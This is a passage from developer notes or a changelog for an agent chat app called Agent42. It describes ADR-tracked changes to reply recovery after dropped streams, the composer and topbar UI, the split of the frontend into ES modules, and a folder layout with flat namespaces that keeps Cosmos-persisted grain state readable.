  into the bubble it was streaming into (`recoverPersistedReply`), painting the error only if nothing
  turns up. **What makes that possible is an implicit server property, not endpoint code:** Kestrel
  *discards* writes to an aborted connection instead of faulting them (measured with a real RST), so the
  endpoint's `await foreach` keeps draining and `AgentGrain` writes its session as usual — which is why
  wiring `HttpContext.RequestAborted` into the turn would silently break this (the grain persists only
  **after** the last event, so a cancelled turn is a *lost* turn). `ChatStreamDisconnectTests` pins it on
  **real Kestrel + a raw socket**, because TestServer's in-memory pipe cannot reproduce a dead transport
  and the same test there passes against a broken endpoint. Three client traps: the backgrounded flag must
  be **latched by a `visibilitychange` listener** (a frozen PWA runs no JS, so `document.hidden` read in
  the `catch` always says "no"); `priorTurns` must be snapshotted **before** the turn appends its two
  bubbles; and recovery is a **success**, so it runs the success tail (`setPendingAgentId(null)` +
  `setTopbarShare`). Backgrounded turns poll 15 × 2 s, foreground failures get **one** look and fail fast;
  an incognito chat (ADR 0034) is never recovered (never written). Verified in headless Chrome both ways —
  with the change the full reply appears, with `send.js` reverted the same script reproduces the bug.
  Shell cache bumped `agent42-shell-v17` → `-v18`.
- Composer send button removed (ADR 0043, **amends 0023**): `#sendBtn` is gone — markup, the four
  `.composer__send*` rules, the `dom.js` export and its five references across `send.js`/`models.js` — and
  `#promptInput` carries **`enterkeyhint="send"`** so a touch keyboard labels its return key **Send**.
  `wireComposer()`'s keydown handler (`Enter` → `form.requestSubmit()`, `Shift+Enter` → newline) is now
  **the only path that sends arbitrary composed text**; `form.requestSubmit()` never needed a default
  submitter, and `send()` is still called directly by the suggestion chips (ADR 0036) and voice (ADR 0037),
  neither of which needs Enter (nor substitutes for it — they send their own text, not yours). Two consequences to know: the **no-model gate
  (ADR 0019) now rests on `input.disabled` alone** — sufficient, because a disabled `<textarea>` fires no
  `keydown`, which is what keeps ADR 0023's "a share prefills but **cannot send**" property true, and which
  makes that one line load-bearing (`ComposerAssetsTests` pins it); and **`enterkeyhint` has no automated
  proof** — the test pins the attribute string, the platform behaviour is a device fact (ADR 0037's
  untestable-half treatment), and **neither interactive leg was run** — no browser driver was available,
  so the desktop smoke *and* the Android Send key / end-to-end share flow are unverified residuals
  recorded in ADR 0043. No busy-state replacement: the streaming caret is the signal and mid-turn
  `Enter` stays silently ignored. The surviving
  `.composer__hint` still names `<kbd>` keys a soft keyboard lacks and is not responsive at ≤760px — a
  known gap, deliberately unfixed. A stop-generation button is explicitly **out of scope** (own ADR).
- Persistent topbar action cluster (ADR 0044, **amends 0034 + 0035**): `.topbar` — previously
  `display: none` above 760px, off-canvas chrome for the mobile drawer only — is now revealed at **every**
  width and carries a right-aligned `.topbar__actions` cluster holding the **incognito toggle** (moved out
  of `.composer__frame`, same `#incognitoBtn` id and same state rules) and **`#topbarShareBtn`**, a second
  entry point into ADR 0035's dialog. **The mechanism is the existing box model, not new layout
  machinery:** `.topbar` is a static flex *sibling* above `.chat__scroll` (the only element in the main
  column that scrolls), so "stays visible while scrolling" needs no `position: sticky` and **no z-index** —
  and that absence is load-bearing, because `#usageView` (`position: fixed; z-index: 100`) still covers the
  topbar precisely *because* the topbar is unpositioned. `.topbar__brand` and `.topbar__menu` are inverted
  to **mobile-only** (the desktop sidebar header already renders the same mark + wordmark, so a naively
  revealed brand doubles it). The engaged incognito tint **moved** — `body.is-incognito .composer__frame`
  is deleted in favour of `body.is-incognito .topbar` (same body class, so `setIncognito` is unchanged),
  and `.composer__incognito` is gone from both markup and stylesheet. Share availability is driven from
  **four** transitions — `startNewConversation` / `startAgentChat` / `selectConversation` / `send()`'s
  success path — held in a `setTopbarShare(convId, title)` setter slot on `sharelinks.js` (the `send.js`
  `voice`/`stopSpeech` seam, **not** a cycle workaround: ADR 0041 §5 permits the cycles). Two things to
  read before touching this: **`startAgentChat` is the transition that bites** — it does not delegate to
  `startNewConversation`, so without an explicit `setTopbarShare(null)` after its continuous early-return,
  a fresh agent chat leaves the button enabled and pointing at the **previous** conversation, and Create
  would mint a public link to a chat the user isn't looking at (ADR 0035's consent property); and the
  `send()` enable belongs at the **end of the `try`**, never beside the `incognitoBtn.disabled` lock at the
  top, which runs before the fetch and would light it up on a failed, offline or barged-in turn. Shell
  cache bumped `agent42-shell-v14` → `-v15` (this adds a named export). Unlike ADR 0043 the manual leg
  **was** actually run — headless Chrome over CDP against DevHost, both themes, both widths — and the ADR
  records the measured values.
- Frontend layout (ADR 0041, the frontend instalment of 0039/0040): the 3616-line `app.js` IIFE is
  **gone**, split into **28 native ES modules** in `src/Agent42.Backend/wwwroot/js/`, loaded by one
  `<script type="module" src="js/main.js">`. Module names reuse the Agents/Backend feature vocabulary
  (`src/Agent42.Backend/wwwroot/js/mcp.js` pairs with `src/Agent42.Backend/Mcp/`). **Native ES modules precisely because they need
  no build step** — `marked`/`purify` stay classic scripts and execute first, so they remain globals.
  **There is deliberately NO flat-namespace analogue to ADR 0039 here**: ES specifiers are file paths
  the browser resolves at load time and are never persisted, so the Cosmos `$type` hazard has no
  frontend counterpart. State is **per-module `export let`** owned by its single writer, never a shared
  `state.js` — cross-module reads use the live binding (so read sites are byte-identical, which is what
  kept six existing assertions intact), and the handful of cross-module writes go through exported
  setters. `main.js` is the **composition root**: imported by nobody, the only caller of each
  feature's `wire*()`/`init*()`. Three traps to read before touching this: `sw.js`'s `SHELL` is
  **all-or-nothing** and now bidirectional (a *stale* entry kills the whole SW, not just one file);
  **every MR touching `wwwroot/js/` must bump `CACHE`** (cache-first subresources + a renamed export =
  `SyntaxError` and a blank app); and a module unreachable from `main.js` is **invisible to every
  source-text asset guard** (the fixture's `GetAppScriptAsync()` walks the import graph over HTTP).
  All three are in gotchas, and all three are asserted in `ProjectLayoutTests`/`PwaAssetsTests`.
  `styles.css` and `index.html`'s markup are deliberately untouched — separate MRs.
- Project layout (ADR 0039): `src/Agent42.Agents` is organised into feature folders — **the 20 directories
  `ProjectLayoutTests.ExpectedFolders()` pins by name** (that list, not a count in prose, is the
  authority; `Skills/` is runtime skill content rather than code, but it is in the set)
  (`Conversations/`, `Web/`, `Documents/`, `Mcp/`, `StoredAgents/`, …), and `AgentGrain` is split into
  **`partial` files that live in those folders — the set `ProjectLayoutTests.AgentGrainParts()` pins by
  name is the authority, not a count in prose** (it stood at 12 for ADRs 0061–0063, 13 after ADR 0066's
  `src/Agent42.Agents/Documents/AgentGrain.WebDocumentTool.cs`, and is 14 since ADR 0068's
  `src/Agent42.Agents/Conversations/AgentGrain.Retention.cs`; `AgentGrainState.cs` is NOT one of them, which is what
  a count here kept getting wrong). **Every type stays in the flat `Agent42.Agents`
  namespace — folders and namespaces deliberately DISAGREE, and that is load-bearing, not sloppiness.**
  Orleans Cosmos grain storage uses `JsonGrainStorageSerializer`, which writes the full CLR type name
  into every document (`"$type":"Agent42.Agents.AgentGrainState, Agent42.Agents"`), so giving a
  persisted type a folder-matching namespace makes **every existing document unreadable** — it throws on
  the root type, taking out every conversation, agent, profile and setting at once. That is not
  hypothetical: the folder-matching-namespace version of this refactor was fully built and passed the
  entire suite, lint, an adversarial review and CI before the flaw was found, because the serialization
  test exercised Orleans' *binary* serializer, which Cosmos does not use. `.editorconfig` disables
  IDE0130 so the IDE stops suggesting the change, and `ProjectLayoutTests` +
  `GrainStorageSerializerTests` catch it if made by hand. `[Alias]` is a **separate** mechanism (the
  binary path) and is **not** what protects data at rest. `ReceiveReminder` stays in the core `AgentGrain`
  part beside `ChatAsync` (the `_turnLocation`/`_ephemeral` clears must be read together); `Skills/` does
  not move (csproj `Content` glob); `Agent42.Tests` stays flat on purpose.
- Backend layout (ADR 0040, extends 0039): `src/Agent42.Backend` follows the same pattern — **the 23
  directories `ProjectLayoutTests.ExpectedFolders()` pins** (`Properties/` and `wwwroot/` ride in that
  set without being features; `Orleans/` joined in ADR 0062, `Calendar/` left in ADR 0063) mirroring the Agents vocabulary (so `src/Agent42.Agents/Attachments/IAttachmentStore.cs` pairs
  visibly with `src/Agent42.Backend/Attachments/BlobAttachmentStore.cs`), **flat `Agent42.Backend` namespace**, and
  `Program.cs` alone at the project root. `MapAgentApi` is split into **16 per-feature partials**
  (`src/Agent42.Backend/Mcp/AgentApi.Mcp.cs`, …) with `src/Agent42.Backend/Api/AgentApi.cs` reduced to a 50-line composition root, and the
  request/response records live beside their feature as `*Contracts.cs`. Backend persists nothing, so
  the flat namespace is **not** forced here as it is in Agents — it is kept flat for consistency and
  because a type that later moves into a persisted position must not carry a folder-shaped namespace
  with it. **The new trap this split introduces: an endpoint group that exists but is never called from
  `MapAgentApi` compiles cleanly and silently deletes every endpoint in it** — guarded by
  `ProjectLayoutTests.AgentApiPart_ExistsAndIsRegisteredFromTheCompositionRoot`.
